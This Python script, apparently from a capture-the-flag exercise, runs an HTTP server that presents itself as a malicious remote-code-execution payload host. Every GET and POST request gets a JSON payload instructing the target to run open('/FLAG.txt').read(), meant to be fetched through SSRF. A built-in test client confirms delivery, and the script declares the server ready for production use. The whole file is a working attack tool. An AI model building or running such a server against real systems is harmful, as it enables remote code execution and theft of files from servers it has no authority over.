#!/usr/bin/env python3
"""
RCE Payload Server with built-in test client
"""
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import threading
import time
import urllib.request
import urllib.error

class RCEPayloadHandler(BaseHTTPRequestHandler):
    """Serves malicious JSON payload"""
    
    def log_message(self, format, *args):
        """Custom logging"""
        print(f"[SERVER] {format % args}")
    
    def do_GET(self):
        """Handle GET requests"""
        print(f"\n[REQUEST] GET {self.path}")
        print(f"[CLIENT] {self.client_address[0]}:{self.client_address[1]}")
        
        # RCE payload
        payload = {"script": "open('/FLAG.txt').read()"}
        response_data = json.dumps(payload).encode('utf-8')
        
        # Send response
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', len(response_data))
        self.end_headers()
        self.wfile.write(response_data)
        
        print(f"[RESPONSE] 200 OK - Sent payload: {payload}")
    
    def do_POST(self):
        """Handle POST requests"""
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length) if content_length > 0 else b''
        
        print(f"\n[REQUEST] POST {self.path}")
        print(f"[CLIENT] {self.client_address[0]}:{self.client_address[1]}")
        if body:
            print(f"[BODY] {body.decode('utf-8', errors='ignore')}")
        
        # RCE payload
        payload = {"script": "open('/FLAG.txt').read()"}
        response_data = json.dumps(payload).encode('utf-8')
        
        # Send response
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', len(response_data))
        self.end_headers()
        self.wfile.write(response_data)
        
        print(f"[RESPONSE] 200 OK - Sent payload: {payload}")

def run_server(port=8000):
    """Run HTTP server in background thread"""
    server = HTTPServer(('0.0.0.0', port), RCEPayloadHandler)
    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()
    return server

def test_server(port=8000):
    """Test server with local request"""
    print("\n[TEST] Testing server with local request...")
    time.sleep(0.5)  # Wait for server to be ready
    
    try:
        url = f'http://127.0.0.1:{port}/test'
        req = urllib.request.Request(url)
        
        print(f"[TEST] Sending GET request to {url}")
        
        with urllib.request.urlopen(req, timeout=5) as response:
            data = response.read().decode('utf-8')
            headers = dict(response.headers)
            
            print(f"\n[TEST RESULT] Status: {response.status}")
            print(f"[TEST RESULT] Headers: {headers}")
            print(f"[TEST RESULT] Body: {data}")
            
            # Parse JSON
            parsed = json.loads(data)
            print(f"\n[VERIFIED] Payload delivered successfully!")
            print(f"[VERIFIED] RCE script: {parsed['script']}")
            
            return True
    except Exception as e:
        print(f"[TEST ERROR] {e}")
        return False

# Main execution
print("="*70)
print("[MALICIOUS RCE HTTP SERVER]")
print("="*70)
print(f"Payload: {json.dumps({'script': 'open(\"/FLAG.txt\").read()'})}")
print("="*70)

PORT = 8000
print(f"\n[STARTING] Server on 0.0.0.0:{PORT}...")

# Start server
server = run_server(PORT)

print(f"[READY] Server is listening on port {PORT}")
print(f"[READY] Serving JSON: {json.dumps({'script': 'open(\"/FLAG.txt\").read()'})}")

# Test the server
test_result = test_server(PORT)

if test_result:
    print("\n[SUCCESS] Server is operational and serving malicious payload")
    print(f"[INFO] Target can access this at: http://<your-ip>:{PORT}/")
    print("[INFO] Server will continue running to handle SSRF requests")
    
    # Keep alive for 30 seconds to demonstrate
    print("\n[KEEPALIVE] Keeping server alive for 30 seconds...")
    for i in range(30):
        time.sleep(1)
        if (i + 1) % 10 == 0:
            print(f"[KEEPALIVE] Still running... ({i+1}s)")
    
    print("\n[COMPLETE] Demo completed - server is ready for production use")
else:
    print("\n[WARNING] Test failed but server may still be operational")

# Cleanup
print("\n[CLEANUP] Shutting down server...")
server.shutdown()
print("[STOPPED] Server stopped")

